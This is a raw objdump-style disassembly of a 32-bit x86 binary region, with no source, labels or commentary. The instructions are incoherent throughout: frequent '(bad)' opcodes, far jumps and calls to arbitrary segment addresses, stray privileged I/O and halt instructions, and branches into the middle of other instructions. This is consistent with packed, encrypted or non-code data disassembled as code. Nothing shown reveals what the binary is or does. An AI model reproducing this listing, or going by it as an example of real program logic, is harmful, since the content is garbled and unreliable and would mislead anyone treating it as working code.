  405602:	sub    DWORD PTR gs:[edi+ebp*4],esp
  405606:	dec    ecx
  405607:	sbb    dl,BYTE PTR [eax]
  405609:	gs and bh,al
  40560c:	nop
  40560d:	pop    ebx
  40560e:	fcom   st(1)
  405610:	ret    
  405611:	push   ebp
  405612:	dec    esi
  405613:	sbb    BYTE PTR [edi+0x23],cl
  405616:	mov    cl,0x87
  405618:	cmp    ebp,DWORD PTR [eax-0x7e2590d7]
  40561e:	cmp    bl,dh
  405620:	xor    edx,0x345d178c
  405626:	sbb    BYTE PTR [edi],0xd8
  405629:	cwde   
  40562a:	xchg   ebx,eax
  40562b:	pushf  
  40562c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562d:	mov    ?,WORD PTR [esi+0x3e]
  405630:	ss mov bl,0x3d
  405633:	add    ch,cl
  405635:	jne    0x405651
  405637:	ins    BYTE PTR es:[edi],dx
  405638:	scas   eax,DWORD PTR es:[edi]
  405639:	add    DWORD PTR [edx-0xa],0xfffffffc
  40563d:	or     ch,ah
  40563f:	in     al,0x2d
  405641:	dec    edi
  405642:	push   ebx
  405643:	sub    BYTE PTR cs:[edi-0x6f7e0908],ah
  40564a:	and    ecx,eax
  40564c:	dec    ebx
  40564d:	sub    al,0x48
  40564f:	das    
  405650:	inc    esi
  405651:	js     0x4055eb
  405653:	mov    edi,0xc58b52d
  405658:	test   DWORD PTR [ecx-0x19],esi
  40565b:	sahf   
  40565c:	push   esi
  40565d:	jmp    0xa6dc:0xf8304d9f
  405664:	aam    0xd8
  405666:	loope  0x405692
  405668:	cmp    DWORD PTR [ebp-0x448eafac],edx
  40566e:	fiadd  DWORD PTR [edx]
  405670:	add    DWORD PTR [ecx],esp
  405672:	repz in eax,0x3b
  405675:	test   al,0x4b
  405677:	mov    bp,0x8342
  40567b:	mov    esi,0xf1921fa3
  405680:	jmp    0xef681eb6
  405685:	mov    cl,0x44
  405687:	dec    ebx
  405688:	mov    esp,0x2433bfe8
  40568d:	mov    eax,0x5ac07c15
  405692:	pushf  
  405693:	stos   DWORD PTR es:[edi],eax
  405694:	add    DWORD PTR [ebp-0x3a],ebx
  405697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405698:	inc    edi
  405699:	dec    esi
  40569a:	push   ss
  40569b:	test   cl,cl
  40569d:	pop    ebx
  40569e:	jmp    0xc3b3085c
  4056a3:	dec    ebp
  4056a4:	lods   eax,DWORD PTR ds:[esi]
  4056a5:	xchg   edx,eax
  4056a6:	lock add cl,BYTE PTR [eax-0x72]
  4056aa:	(bad)  
  4056ab:	adc    eax,0xe53d2388
  4056b0:	mov    BYTE PTR [esi],cl
  4056b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b3:	inc    eax
  4056b4:	ss or  eax,0x5d49f49c
  4056ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bb:	fcmovnb st,st(6)
  4056bd:	push   cs
  4056be:	inc    esi
  4056bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c0:	test   DWORD PTR [edi],esp
  4056c2:	pop    edi
  4056c3:	jecxz  0x40573b
  4056c5:	mov    eax,ds:0x2edc27b6
  4056ca:	jbe    0x40569e
  4056cc:	sbb    eax,0x74c4f995
  4056d1:	lock leave 
  4056d3:	xor    ah,al
  4056d5:	push   ds
  4056d6:	loop   0x40572c
  4056d8:	arpl   WORD PTR [esi+0x62],si
  4056db:	lods   al,BYTE PTR ds:[esi]
  4056dc:	data16 xor dl,BYTE PTR [eax-0x5df9cd9e]
  4056e3:	inc    edi
  4056e4:	je     0x405701
  4056e6:	out    dx,al
  4056e7:	xchg   ebx,eax
  4056e8:	and    bh,BYTE PTR [ecx+0x24eb3b73]
  4056ee:	pop    ebp
  4056ef:	daa    
  4056f0:	retf   
  4056f1:	outs   dx,DWORD PTR ds:[esi]
  4056f2:	push   ecx
  4056f3:	xchg   ebp,eax
  4056f4:	lods   al,BYTE PTR ds:[esi]
  4056f5:	dec    esp
  4056f6:	ja     0x405724
  4056f8:	inc    ebp
  4056f9:	hlt    
  4056fa:	add    ebx,DWORD PTR fs:[edi+eiz*2+0x47a97dc0]
  405702:	ins    BYTE PTR es:[edi],dx
  405703:	lock in al,dx
  405705:	test   eax,0xab8d8a72
  40570a:	retf   
  40570b:	(bad)  
  40570c:	rcl    BYTE PTR [ebx],cl
  40570e:	push   0x3
  405710:	retf   
  405711:	(bad)  
  405712:	call   FWORD PTR [eax+ebx*8]
  405715:	sub    eax,0xa21ff2fe
  40571a:	jbe    0x4056bf
  40571c:	mov    bl,0xa9
  40571e:	add    al,0xd8
  405720:	mov    ebx,0x93784c80
  405725:	scas   eax,DWORD PTR es:[edi]
  405726:	and    BYTE PTR [eax-0x39],dh
  405729:	out    0xe0,al
  40572b:	test   al,0x56
  40572d:	sub    DWORD PTR [edx+0x1b],ebp
  405730:	jae    0x40571e
  405732:	imul   BYTE PTR [eax]
  405734:	or     BYTE PTR [ebx-0x67],ah
  405737:	push   cs
  405738:	and    eax,0x749c1dcf
  40573d:	xor    al,0x2b
  40573f:	pop    esi
  405740:	mov    sp,0x9f1a
  405744:	in     eax,0xf2
  405746:	sbb    DWORD PTR [edi+0xa5186b8],0x68
  40574d:	adc    ah,BYTE PTR [eax]
  40574f:	cwde   
  405750:	jns    0x40574d
  405752:	xlat   BYTE PTR ds:[ebx]
  405753:	xor    eax,0x2efa7219
  405758:	cld    
  405759:	retf   
  40575a:	loopne 0x405790
  40575c:	push   esi
  40575d:	test   DWORD PTR [edi+edx*4-0x67090e70],ecx
  405764:	in     eax,dx
  405765:	pop    ebx
  405766:	and    eax,0x2cc39a5f
  40576b:	push   eax
  40576c:	(bad)  
  40576d:	ficomp WORD PTR [ebx+0x5ee64ecf]
  405773:	sti    
  405774:	retf   0x1620
  405777:	leave  
  405778:	sbb    BYTE PTR [eax],bh
  40577a:	push   ds
  40577b:	scas   eax,DWORD PTR es:[edi]
  40577c:	mov    cs,WORD PTR [eax]
  40577e:	outs   dx,BYTE PTR ds:[esi]
  40577f:	dec    eax
  405780:	pop    es
  405781:	xor    BYTE PTR [eax+0x65c81235],dl
  405787:	mov    ah,0xf0
  405789:	(bad)  
  40578a:	into   
  40578b:	ins    BYTE PTR es:[edi],dx
  40578c:	(bad)  [edi]
  40578e:	dec    ecx
  40578f:	xchg   esp,eax
  405790:	push   ecx
  405791:	adc    eax,0xf2bcd7bf
  405796:	call   0x129e5eaf
  40579b:	push   es
  40579c:	push   edx
  40579d:	std    
  40579e:	jmp    FWORD PTR [ebp+0x2]
  4057a1:	stos   DWORD PTR es:[edi],eax
  4057a2:	dec    edi
  4057a3:	mov    edx,0xfc05ef13
  4057a8:	sub    DWORD PTR [ebp+0x2c],edx
  4057ab:	gs pop esp
  4057ad:	popa   
  4057ae:	ja     0x4057f1
  4057b0:	clc    
  4057b1:	retf   0xdbe4
  4057b4:	mov    ebp,0x11b18fd0
  4057b9:	test   DWORD PTR [ecx],eax
  4057bb:	scas   eax,DWORD PTR es:[edi]
  4057bc:	or     al,0xac
  4057be:	addr16 pop ds
  4057c0:	ja     0x405747
  4057c2:	and    DWORD PTR [eax],esi
  4057c4:	(bad)  [edx-0x15]
  4057c7:	imul   ebp,DWORD PTR [eax-0x12],0xffffff8e
  4057cb:	mov    edx,0x891ef1d7
  4057d0:	cs jno 0x40579a
  4057d3:	scas   al,BYTE PTR es:[edi]
  4057d4:	add    al,0x70
  4057d6:	push   ecx
  4057d7:	and    dh,cl
  4057d9:	mov    edi,0x8d933446
  4057de:	loope  0x405767
  4057e0:	mov    bl,BYTE PTR [ebp-0x6dc17ca6]
  4057e6:	fcom   QWORD PTR [ebp+0x3a]
  4057e9:	jl     0x4057d4
  4057eb:	pop    ebp
  4057ec:	mov    dh,0x9d
  4057ee:	out    dx,eax
  4057ef:	shl    ebp,1
  4057f1:	dec    edi
  4057f2:	dec    ebp
  4057f3:	add    dh,ch
  4057f5:	mov    DWORD PTR [ebp+0x236b0c3a],ebx
  4057fb:	fcomp  st(0)
  4057fd:	cwde   
  4057fe:	sbb    BYTE PTR [eax-0x5d],dl
  405801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405802:	sub    al,0xcc
  405804:	xchg   ebp,eax
  405805:	scas   eax,DWORD PTR es:[edi]
  405806:	or     BYTE PTR [ebx-0x3113a0ab],0x2d
  40580d:	push   ecx
  40580e:	cli    
  40580f:	cmp    eax,0xbc2b6c01
  405814:	dec    edi
  405815:	outs   dx,BYTE PTR ds:[esi]
  405816:	sti    
  405817:	cwde   
  405818:	mov    al,gs:0x1a363b64
  40581e:	mov    dl,0x30
  405820:	cmp    DWORD PTR [ebx+ebx*4-0x6217724c],0x26
  405828:	pop    ecx
  405829:	sahf   
  40582a:	adc    ch,BYTE PTR [edx+0x4a312f6d]
  405830:	imul   ch
  405832:	test   eax,0xe5a79eb0
  405837:	das    
  405838:	(bad)  
  40583a:	sahf   
  40583b:	push   0x42cf722b
  405840:	mov    esp,0xcce88276
  405845:	xor    eax,DWORD PTR [esi+0x67]
  405848:	ja     0x4058a1
  40584a:	sahf   
  40584b:	mov    ebx,0x11ab54ae
  405850:	lahf   
  405851:	pop    ecx
  405852:	push   esp
  405853:	stos   DWORD PTR es:[edi],eax
  405854:	xor    ah,BYTE PTR [eax]
  405856:	push   edi
  405857:	bnd jo 0x4057ed
  40585a:	xor    ecx,0x18367e5f
  405860:	add    esp,esi
  405862:	pop    eax
  405863:	mov    ds:0x36173eed,al
  405868:	dec    edx
  405869:	neg    DWORD PTR [edi-0x1a5d5de5]
  40586f:	add    DWORD PTR [ecx+0x1e9c7009],0x4ca9c390
  405879:	jecxz  0x405829
  40587b:	mov    dl,0xd
  40587d:	cmp    edx,DWORD PTR [edi-0x1aeac016]
  405883:	cdq    
  405884:	pop    ebx
  405885:	rcr    BYTE PTR [ecx+0x4a],0x3a
  405889:	imul   ebx,esp,0xb90fa126
  40588f:	lock add DWORD PTR [edi+ebx*4-0x4],ecx
  405894:	and    BYTE PTR [esi-0x642cb293],bh
  40589a:	out    dx,eax
  40589b:	dec    eax
  40589c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40589d:	add    DWORD PTR [ecx+eax*4],edx
  4058a0:	xchg   DWORD PTR [edi+0x18],eax
  4058a3:	adc    DWORD PTR [eax-0x454c3713],ebp
  4058a9:	js     0x405898
  4058ab:	in     al,0x25
  4058ad:	pusha  
  4058ae:	inc    ecx
  4058af:	hlt    
  4058b0:	repnz sahf 
  4058b2:	push   ebp
  4058b3:	or     eax,eax
  4058b5:	pushf  
  4058b6:	or     ah,BYTE PTR [ecx+ebp*4]
  4058b9:	or     ebx,DWORD PTR [ecx+esi*2+0x575934b8]
  4058c0:	xor    BYTE PTR [edi],bl
  4058c2:	cld    
  4058c3:	jmp    0x4e57c9da
  4058c8:	das    
  4058c9:	and    ecx,DWORD PTR [edi-0x7e]
  4058cc:	jg     0x405943
  4058ce:	sub    ecx,DWORD PTR [ecx]
  4058d0:	pop    ecx
  4058d1:	fnstsw WORD PTR [eax]
  4058d3:	mov    DWORD PTR [ecx],0x22c1bc2b
  4058d9:	push   ecx
  4058da:	retf   0x8611
  4058dd:	mov    ebp,esp
  4058df:	out    dx,al
  4058e0:	int    0xac
  4058e2:	fdivr  DWORD PTR [edx+0x7c]
  4058e5:	mov    ebx,DWORD PTR [esi-0x66]
  4058e8:	clc    
  4058e9:	push   esp
  4058ea:	sbb    BYTE PTR [ebx],0x48
  4058ed:	xchg   ecx,eax
  4058ee:	xor    al,0x7b
  4058f0:	out    dx,eax
  4058f1:	cdq    
  4058f2:	push   0xffffffde
  4058f4:	adc    dl,BYTE PTR [ecx+0x19a8ffd2]
  4058fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058fb:	cwde   
  4058fc:	and    BYTE PTR [eax],bl
  4058fe:	xor    al,0xd1
  405900:	fwait
  405901:	pop    ds
  405902:	mov    bl,0xca
  405904:	ret    
  405905:	in     eax,0x6
  405907:	adc    dl,BYTE PTR [eax+0x56]
  40590a:	and    BYTE PTR [edi+0x4b],0x59
  40590e:	dec    ebx
  40590f:	stos   BYTE PTR es:[edi],al
  405910:	fld    DWORD PTR [eax]
  405912:	ret    0xa087
  405915:	inc    ebx
  405916:	das    
  405917:	call   0x61804f86
  40591c:	adc    DWORD PTR [edi],0x16
  40591f:	mov    eax,ds:0x64e7ce1c
  405924:	outs   dx,BYTE PTR ds:[esi]
  405925:	mov    dh,al
  405927:	mov    cl,al
  405929:	popa   
  40592a:	lahf   
  40592b:	pop    ds
  40592c:	pop    esp
  40592d:	out    0x29,al
  40592f:	call   0x8f89:0xac360cdf
  405936:	jbe    0x405985
  405938:	xor    cl,BYTE PTR [ebx+0x14]
  40593b:	clc    
  40593c:	cld    
  40593d:	pop    ss
  40593e:	mov    ds:0x3176e6f6,al
  405943:	add    al,0x29
  405945:	pop    edx
  405946:	adc    ch,BYTE PTR [ebx+ebx*4+0x7c6c7ea]
  40594d:	push   cs
  40594e:	mov    al,ds:0xf46bc067
  405953:	jmp    0x405972
  405955:	pop    ebx
  405956:	std    
  405957:	ja     0x4058de
  405959:	sub    edi,DWORD PTR [edx]
  40595b:	fld    TBYTE PTR [ebx+ecx*1-0x6555ff85]
  405962:	lods   eax,DWORD PTR ds:[esi]
  405963:	xchg   esp,eax
  405964:	sub    eax,0xd5e8040d
  405969:	jns    0x4059c6
  40596b:	fsub   QWORD PTR [esi+0x58]
  40596e:	daa    
  40596f:	dec    esi
  405970:	jnp    0x405955
  405972:	cmp    DWORD PTR [edx+0x25],0xffffff9b
  405976:	push   ds
  405977:	shl    ch,1
  405979:	sti    
  40597a:	and    al,0x36
  40597c:	sub    eax,0x61806cb6
  405981:	cmp    al,0x34
  405983:	lea    esi,[ecx-0x13]
  405986:	add    ah,BYTE PTR [edi-0x8a998ad]
  40598c:	ins    DWORD PTR es:[edi],dx
  40598d:	sub    DWORD PTR [ebp-0x3e11f4a5],esp
  405993:	add    al,0xba
  405995:	inc    edx
  405996:	adc    eax,0x7b5f1e88
  40599b:	xchg   DWORD PTR [edi+eax*4],edx
  40599e:	mov    ebp,0x5d8a9c58
  4059a3:	aam    0xb7
  4059a5:	mov    BYTE PTR gs:[ebx+0x5b],ch
  4059a9:	(bad)  
  4059ab:	and    eax,0xeac5796b
  4059b0:	cmp    DWORD PTR [eax+0x30d594d2],ebx
  4059b6:	mov    ebp,0x9b59e274
  4059bb:	mov    DWORD PTR [edi+0x6723b228],ebp
  4059c1:	mov    ebx,0x8b1197a4
  4059c6:	loop   0x405a04
  4059c8:	mov    cl,0xd9
  4059ca:	mov    DWORD PTR [edx-0x62],edi
  4059cd:	(bad)  
  4059ce:	cdq    
  4059cf:	and    bh,bl
  4059d1:	pop    ebp
  4059d2:	aad    0x89
  4059d4:	sbb    al,0xaf
  4059d6:	imul   esi,DWORD PTR [edx-0x7bb741d],0xffffffbf
  4059dd:	ins    DWORD PTR es:[edi],dx
  4059de:	sbb    DWORD PTR [ecx],ebx
  4059e0:	jp     0x405965
  4059e2:	or     DWORD PTR [eax+0x4f],ecx
  4059e5:	dec    edx
  4059e6:	in     al,0x11
  4059e8:	sbb    BYTE PTR [esi-0x48],bl
  4059eb:	jg     0x40597d
  4059ed:	xor    eax,0xbb00eb58
  4059f2:	fimul  DWORD PTR [esp+ebx*8-0xdc95112]
  4059f9:	jbe    0x405a42
  4059fb:	in     eax,0xd2
  4059fd:	sbb    ebp,ecx
  4059ff:	mov    esi,0xf96b47d9
  405a04:	xchg   esp,eax
  405a05:	and    BYTE PTR [edi],0xc0
  405a08:	inc    edi
  405a09:	data16 jne 0x405a55
  405a0c:	inc    ebp
  405a0d:	mov    ebp,0x283dbeb8
  405a12:	mov    esi,0x6fc84b3
  405a17:	sub    ebx,esi
  405a19:	add    cl,BYTE PTR [edx-0x2f1588e]
  405a1f:	xor    DWORD PTR [edi],eax
  405a21:	(bad)  
  405a22:	jmp    0xe6f7c57b
  405a27:	jb     0x405a20
  405a29:	xchg   edx,eax
  405a2a:	push   ds
  405a2b:	pop    edi
  405a2c:	mov    edi,DWORD PTR [esi]
  405a2e:	bound  edx,QWORD PTR [ebx+0x46efc86a]
  405a34:	pushf  
  405a35:	mov    ds:0xeba2beb,eax
  405a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3b:	xchg   DWORD PTR [esi-0x14707a8f],ecx
  405a41:	cli    
  405a42:	fidiv  DWORD PTR [eax-0x4154e45f]
  405a48:	(bad)  
  405a49:	bound  eax,QWORD PTR [esi-0x59e5c2f6]
  405a4f:	test   al,0xa1
  405a51:	jne    0x4059dd
  405a53:	nop
  405a54:	ficomp WORD PTR [ebx]
  405a56:	mov    ch,0xc4
  405a58:	aaa    
  405a59:	jl     0x405a2f
  405a5b:	xchg   ecx,eax
  405a5c:	test   BYTE PTR [ebx-0x6925c79f],cl
  405a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a63:	jno    0x405ad7
  405a65:	dec    edi
  405a66:	dec    ecx
  405a67:	cld    
  405a68:	(bad)  
  405a69:	jno    0x405a3d
  405a6b:	aam    0x87
  405a6d:	dec    ecx
  405a6e:	js     0x405a84
  405a70:	add    eax,0x5ec5453b
  405a75:	adc    bl,cl
  405a77:	or     eax,0xb3bbd667
  405a7c:	(bad)  
  405a7d:	out    0x3d,eax
  405a7f:	data16 sbb BYTE PTR [ebx-0x5c56117c],ah
  405a86:	call   0xd2e:0xde2ab6d6
  405a8d:	out    0x1e,eax
  405a8f:	xor    BYTE PTR [edx-0x1d],bh
  405a92:	xchg   edx,eax
  405a93:	outs   dx,DWORD PTR ds:[esi]
  405a94:	aad    0x5c
  405a96:	iret   
  405a97:	sub    bh,BYTE PTR [ebx]
  405a99:	cli    
  405a9a:	popa   
  405a9b:	sub    BYTE PTR [ecx],ch
  405a9d:	(bad)  
  405a9e:	xor    BYTE PTR [edi],ch
  405aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa1:	div    BYTE PTR [edx]
  405aa3:	mov    dh,0xfb
  405aa5:	sub    eax,0xedec63b4
  405aaa:	adc    al,0x32
  405aac:	sub    cl,BYTE PTR [edx+0x1d75864a]
  405ab2:	xchg   ebp,eax
  405ab3:	std    
  405ab4:	shl    BYTE PTR [eax-0x656f11f1],0x54
  405abb:	xchg   edi,eax
  405abc:	add    BYTE PTR [edx+esi*8],cl
  405abf:	ins    DWORD PTR es:[edi],dx
  405ac0:	outs   dx,DWORD PTR ds:[esi]
  405ac1:	mov    ebx,0x1ac1226
  405ac6:	xchg   ecx,eax
  405ac7:	mov    eax,0xa61e348e
  405acc:	or     eax,edi
  405ace:	mov    ah,BYTE PTR ds:0x4c9c0175
  405ad4:	clc    
  405ad5:	cmp    al,0xc1
  405ad7:	mov    esi,es
  405ad9:	test   eax,edi
  405adb:	(bad)
  405adf:	(bad)  
  405ae1:	dec    eax
  405ae2:	cmc    
  405ae3:	dec    ecx
  405ae4:	arpl   cx,ax
  405ae6:	push   es
  405ae7:	ins    DWORD PTR es:[edi],dx
  405ae8:	mov    ds:0x250ffeb,eax
  405aed:	inc    edi
  405aee:	and    BYTE PTR [edx+0x67e30213],dh
  405af4:	adc    BYTE PTR [edx],0xcd
  405af7:	jmp    0x405b12
  405af9:	loopne 0x405b31
  405afb:	xchg   DWORD PTR [ecx+0x79],ebx
  405afe:	cmp    ecx,DWORD PTR [ecx]
  405b00:	xor    bl,BYTE PTR [eax]
  405b02:	add    esp,DWORD PTR [ebx-0x72]
  405b05:	outs   dx,BYTE PTR ds:[esi]
  405b06:	and    dl,BYTE PTR [esi]
  405b08:	fcomp  DWORD PTR [eax]
  405b0a:	inc    edx
  405b0b:	fwait
  405b0c:	into   
  405b0d:	arpl   WORD PTR [ebx],si
  405b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b10:	or     BYTE PTR [ebp+ebp*4+0x4d],ah
  405b14:	shr    DWORD PTR ds:0x425ba785,0x8
  405b1b:	out    dx,eax
  405b1c:	xchg   ebp,eax
  405b1d:	adc    eax,0xef3c23ef
  405b22:	add    bh,BYTE PTR [edi]
  405b24:	xchg   esi,eax
  405b25:	push   ds
  405b26:	and    al,0xbf
  405b28:	jmp    0xe692:0xc94702c8
  405b2f:	aad    0xbb
  405b31:	xchg   esp,eax
  405b32:	je     0x405b83
  405b34:	sbb    BYTE PTR [eax],bh
  405b36:	dec    edi
  405b37:	icebp  
  405b38:	jbe    0x405ae0
  405b3a:	and    al,0xbb
  405b3c:	cli    
  405b3d:	lock adc ebp,DWORD PTR [esi+0x5e]
  405b41:	(bad)  
  405b42:	mov    al,gs:0xe5e2e4f5
  405b48:	pop    ecx
  405b49:	fidivr DWORD PTR [ebp-0x1f]
  405b4c:	and    esi,DWORD PTR [eax-0x4999df87]
  405b52:	pop    esp
  405b53:	xchg   ecx,eax
  405b54:	cli    
  405b55:	lock inc edx
  405b57:	test   DWORD PTR [ecx-0x3d63c33a],ebx
  405b5d:	and    esp,DWORD PTR [edx]
  405b5f:	dec    BYTE PTR [ebp+0x20]
  405b62:	sar    BYTE PTR [ebp-0x20],1
  405b65:	xchg   DWORD PTR [edi+0x7f389b19],eax
  405b6b:	mov    al,0xc3
  405b6d:	fidivr WORD PTR ds:0x171f042d
  405b73:	stos   BYTE PTR es:[edi],al
  405b74:	mov    eax,ds:0x97551035
  405b79:	add    eax,0x1f47b8fe
  405b7e:	gs stos DWORD PTR es:[edi],eax
  405b80:	inc    esp
  405b81:	adc    DWORD PTR [esi-0x7d],0x6de8d69a
  405b88:	and    edx,DWORD PTR [ebx-0x2aa632c6]
  405b8e:	addr16 nop
  405b90:	fcmovb st,st(7)
  405b92:	push   es
  405b93:	stos   DWORD PTR es:[edi],eax
  405b94:	push   esp
  405b95:	cmp    BYTE PTR [ecx+0x3a],dl
  405b98:	in     eax,dx
  405b99:	push   ecx
  405b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b9b:	cli    
  405b9c:	out    dx,eax
  405b9d:	scas   al,BYTE PTR es:[edi]
  405b9e:	inc    edx
  405b9f:	inc    esp
  405ba0:	cmp    al,0xa2
  405ba2:	inc    ecx
  405ba3:	xchg   ecx,eax
  405ba4:	aas    
  405ba5:	push   es
  405ba6:	neg    DWORD PTR [ebx-0x1d]
  405ba9:	jno    0x405c17
  405bab:	fxch   st(0)
  405bad:	mov    ch,0xa6
  405baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb0:	test   BYTE PTR [ebp-0x6d],0xc8
  405bb4:	aaa    
  405bb5:	inc    ebp
  405bb6:	push   ss
  405bb7:	lahf   
  405bb8:	std    
  405bb9:	rcr    BYTE PTR es:0x31ebaf91,cl
  405bc0:	cld    
  405bc1:	pop    esp
  405bc2:	aad    0x5a
  405bc4:	(bad)  
  405bc5:	pop    ds
  405bc6:	jl     0x405be3
  405bc8:	adc    al,0xc2
  405bca:	scas   al,BYTE PTR es:[edi]
  405bcb:	xchg   DWORD PTR [eax],ebx
  405bcd:	dec    esi
  405bce:	or     BYTE PTR [ebx-0x5ca478e3],ch
  405bd4:	adc    bl,BYTE PTR [ebx-0xa]
  405bd7:	xor    ch,BYTE PTR [eax+edx*8-0x5]
  405bdb:	xchg   edx,eax
  405bdc:	inc    edi
  405bdd:	sbb    eax,DWORD PTR [ebx]
  405bdf:	mov    eax,0x32c9452b
  405be4:	adc    DWORD PTR [ebx+ebp*4-0x5c606018],ebp
  405beb:	pop    eax
  405bec:	adc    DWORD PTR [edx+0x5a5313ab],ebx
  405bf2:	jb     0x405bed
  405bf4:	add    DWORD PTR [ecx+0x6b],edi
  405bf7:	sti    
  405bf8:	(bad)  
  405bf9:	punpckhdq mm4,QWORD PTR [esi-0x28]
  405bfd:	pop    eax
  405bfe:	mov    ds:0xa77f0225,eax
  405c03:	xchg   esi,eax
  405c04:	mov    WORD PTR [edi],?
  405c06:	push   edi
  405c07:	arpl   WORD PTR [edx+ecx*8-0x75],si
  405c0b:	in     al,dx
  405c0c:	les    ebp,FWORD PTR [ebx-0x1d2b72b0]
  405c12:	and    al,0x54
  405c14:	dec    edi
  405c15:	and    ebx,0xa739ea33
  405c1b:	cmp    ebp,edi
  405c1d:	je     0x405c12
  405c1f:	fsub   st,st(0)
  405c21:	repz inc edx
  405c23:	cdq    
  405c24:	push   0xb91ba5cd
  405c29:	dec    ebx
  405c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c2b:	mov    dl,0xb9
  405c2d:	popa   
  405c2e:	dec    esp
  405c2f:	dec    esp
  405c30:	shl    DWORD PTR [esp+edx*1-0x57b4d3b2],cl
  405c37:	ret    
  405c38:	(bad)  
  405c39:	cli    
  405c3a:	mov    ebx,eax
  405c3c:	(bad)  
  405c3e:	mov    dh,0x14
  405c40:	cmp    al,0x4a
  405c42:	mov    cl,0xd7
  405c44:	fucomip st,st(2)
  405c46:	and    BYTE PTR [ecx-0x5383a380],bl
  405c4c:	adc    edi,edx
  405c4e:	push   ds
  405c4f:	cmp    al,0x75
  405c51:	cmp    BYTE PTR [edi+0x593f04e6],bh
  405c57:	call   0xd4a5:0xb8888901
  405c5e:	xor    esp,DWORD PTR [eax]
  405c60:	add    DWORD PTR [ebp+ebx*1+0x774b2ed0],edi
  405c67:	sub    edi,DWORD PTR [edx+eax*8]
  405c6a:	sar    DWORD PTR [eax+0x67],cl
  405c6d:	nop
  405c6e:	int3   
  405c6f:	sub    ch,BYTE PTR [ebx-0x2c]
  405c72:	scas   eax,DWORD PTR es:[edi]
  405c73:	mov    bl,0xbe
  405c75:	(bad)  
  405c76:	push   esp
  405c77:	sub    eax,0x6936b3b8
  405c7c:	lods   eax,DWORD PTR ds:[esi]
  405c7d:	jmp    0xbb4d:0xb784
  405c83:	aam    0x73
  405c85:	dec    ecx
  405c86:	ret    0x9f16
  405c89:	and    BYTE PTR [esi+edi*4],bh
  405c8c:	push   ds
  405c8d:	pop    esi
  405c8e:	and    eax,0xef3a9560
  405c93:	push   0xffffffd6
  405c95:	and    BYTE PTR [ebp-0x298a541b],0xca
  405c9c:	data16 in al,dx
  405c9e:	scas   eax,DWORD PTR es:[edi]
  405c9f:	repnz or edi,DWORD PTR [esi+0x77a8e4a6]
  405ca6:	addr16 mov ebp,0x3561aca8
  405cac:	sbb    esi,DWORD PTR [edi+0x2b5248f6]
  405cb2:	mov    ds:0xfdafddc1,eax
  405cb7:	mov    eax,0xf3374cc8
  405cbc:	inc    edx
  405cbd:	pop    eax
  405cbe:	jl     0x405cdd
  405cc0:	mov    BYTE PTR [eax],bl
  405cc2:	popa   
  405cc3:	xor    ch,dl
  405cc5:	loop   0x405d30
  405cc7:	adc    eax,0xa9d9082
  405ccc:	pop    ebx
  405ccd:	jl     0x405d33
  405ccf:	sbb    BYTE PTR [ebp+0x58],al
  405cd2:	outs   dx,BYTE PTR ds:[esi]
  405cd3:	xlat   BYTE PTR ds:[ebx]
  405cd4:	imul   edi,DWORD PTR [ecx-0x2e],0x22
  405cd8:	imul   DWORD PTR [edi]
  405cda:	pop    ss
  405cdb:	add    eax,0xce3c9507
  405ce0:	mov    al,ds:0x9a4f68ac
  405ce5:	mov    WORD PTR [esi-0x46],ss
  405ce8:	mov    ebp,0x40492ff5
  405ced:	add    eax,0x42aab468
  405cf2:	lods   al,BYTE PTR ds:[esi]
  405cf3:	xor    esp,DWORD PTR [edx+0x3]
  405cf6:	call   0xbf1b:0xd1678e4b
  405cfd:	fdiv   QWORD PTR [edx-0x4cdc0d4b]
  405d03:	int    0xa0
  405d05:	(bad)  
  405d06:	push   cs
  405d07:	scas   eax,DWORD PTR es:[edi]
  405d08:	fsub   QWORD PTR [edi-0xd1c7121]
  405d0e:	push   eax
  405d0f:	pusha  
  405d10:	retf   0xae70
  405d13:	adc    eax,0x40f700c2
  405d18:	out    0xe8,eax
  405d1a:	jle    0x405cfc
  405d1c:	mov    esp,0x5e7e8d2
  405d21:	jmp    0x974e:0x523a15b0
  405d28:	idiv   al
  405d2a:	pop    eax
  405d2b:	push   edx
  405d2d:	stc    
  405d2e:	jecxz  0x405ce8
  405d30:	mul    edx
  405d32:	mov    bl,0x71
  405d34:	inc    esp
  405d35:	jb     0x405d79
  405d37:	rcl    al,0xe6
  405d3a:	jmp    FWORD PTR [ebx-0xf]
  405d3d:	sbb    al,ah
  405d3f:	ror    BYTE PTR [ecx+0x1ec8780e],1
  405d45:	test   BYTE PTR [ebx],0xbe
  405d48:	js     0x1d1c0d6a
  405d4e:	ret    0xbef9
  405d51:	stos   DWORD PTR es:[edi],eax
  405d52:	push   edi
  405d53:	loop   0x405da4
  405d55:	jno    0x405d7f
  405d57:	sub    DWORD PTR [esi],edi
  405d59:	adc    DWORD PTR [ecx-0x5e366cff],edi
  405d5f:	push   esp
  405d60:	stos   DWORD PTR es:[edi],eax
  405d61:	push   edi
  405d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d63:	xchg   BYTE PTR [ecx],dh
  405d65:	mov    BYTE PTR [edx],ah
  405d67:	lock arpl ax,bp
  405d6a:	sbb    cl,bl
  405d6c:	xchg   BYTE PTR [ecx-0x2c],dl
  405d6f:	mov    eax,ds:0xfb697d9d
  405d74:	hlt    
  405d75:	nop
  405d76:	dec    ebp
  405d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d78:	aam    0x61
  405d7a:	and    al,0x95
  405d7c:	jae    0x405d7b
  405d7e:	(bad)
  405d81:	jbe    0x405db3
  405d83:	gs shr edx,cl
  405d86:	mov    BYTE PTR ds:0x4c6f632b,dh
